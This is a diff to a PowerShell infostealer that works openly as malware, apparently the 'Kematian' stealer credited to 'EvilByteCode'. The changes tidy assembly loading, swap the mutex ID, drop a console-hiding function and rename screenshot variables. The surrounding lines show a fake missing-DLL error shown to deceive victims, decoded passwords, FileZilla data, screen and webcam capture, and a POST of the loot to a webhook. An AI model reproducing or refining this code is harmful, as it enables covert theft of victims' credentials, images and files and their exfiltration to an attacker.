@@ -17,9 +17,13 @@ else {
 
 $avatar = "https://i.imgur.com/DOIYOtp.gif"
 
+
+# Load WPF assemblies
+Add-Type -AssemblyName PresentationCore, PresentationFramework, System.Net.Http, System.Windows.Forms, System.Drawing
+
 function KDMUTEX {
-    if ($fakeerror ) { Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.", '', 'OK', 'Error') }
-    $AppId = "a77dff94-5f71-4c3d-b0e4-952b0852179b" 
+    if ($fakeerror ) {[System.Windows.Forms.MessageBox]::Show("The program can't start because MSVCP110.dll is missing from your computer. Try reinstalling the program to fix this problem.", '', 'OK', 'Error') }
+    $AppId = "62088a7b-ae9f-4802-827a-6e9c921cb48e" 
     $CreatedNew = $false
     $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
     if ( -not $CreatedNew ) { throw "[!] An instance of this script is already running." }
@@ -33,22 +37,6 @@ function KDMUTEX {
     }
 }
 
-
-function Hide-Console {
-    Add-Type -Name Window -Namespace Console -MemberDefinition '
-[DllImport("Kernel32.dll")]
-public static extern IntPtr GetConsoleWindow();
-
-[DllImport("user32.dll")]
-public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
-'
-    $consolePtr = [Console.Window]::GetConsoleWindow()
-    #0 hide
-    [Console.Window]::ShowWindow($consolePtr, 0)
-}
-
-
-Add-Type -AssemblyName PresentationCore, PresentationFramework
 
 #THIS CODE WAS MADE BY EvilByteCode
 Add-Type -TypeDefinition @"
@@ -836,20 +824,17 @@ Pass: $decodedPass
 
     $main_temp = "$env:localappdata\temp"
 
-
-    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
     $screens = [Windows.Forms.Screen]::AllScreens
     $top = ($screens.Bounds.Top | Measure-Object -Minimum).Minimum
     $left = ($screens.Bounds.Left | Measure-Object -Minimum).Minimum
-    $width = (Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n' | Select-Object -First 1 | ForEach-Object { ($_ -split ' ')[0] }
-    $height = (Get-WmiObject -Class Win32_VideoController).VideoModeDescription -split '\n' | Select-Object -First 1 | ForEach-Object { ($_ -split ' ')[2] }
     $bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
-    $bmp = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
-    $graphics = [Drawing.Graphics]::FromImage($bmp)
+    $image = New-Object Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
+    $graphics = [Drawing.Graphics]::FromImage($image)
     $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
-    $bmp.Save("$main_temp\screenshot.png")
+    $image.Save("$main_temp\screenshot.png")
     $graphics.Dispose()
-    $bmp.Dispose()
+    $image.Dispose() 
+ 
     Write-Host "[!] Screenshot Captured !" -ForegroundColor Green
 
     Move-Item "$main_temp\discord.json" $folder_general -Force    
@@ -1096,8 +1081,7 @@ FileZilla: $filezilla_info
     Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null
 	
     # Send webcam
-    Add-Type -AssemblyName System.Net.Http
-    Add-Type -AssemblyName System.IO
+    
     $items = Get-ChildItem -Path "$env:APPDATA\Kematian" -Filter out*.jpg
     foreach ($item in $items) { $name = $item.Name; Move-Item "$($item.FullName)" $folder_general -Force }
     $jpegfiles = Get-ChildItem -Path $folder_general -Filter out*.jpg
@@ -1142,9 +1126,6 @@ FileZilla: $filezilla_info
 }
 
 if (CHECK_AND_PATCH -eq $true) {
-    if (-not ($debug)) {
-        Hide-Console
-    }
     KDMUTEX
     if (!($debug)) {
         [ProcessUtility]::MakeProcessKillable()
@@ -1162,7 +1143,6 @@ if (CHECK_AND_PATCH -eq $true) {
         }
         catch {}
     }
-
 }
 else {
     Write-Host ("[!] Please run as admin!") -ForegroundColor Red
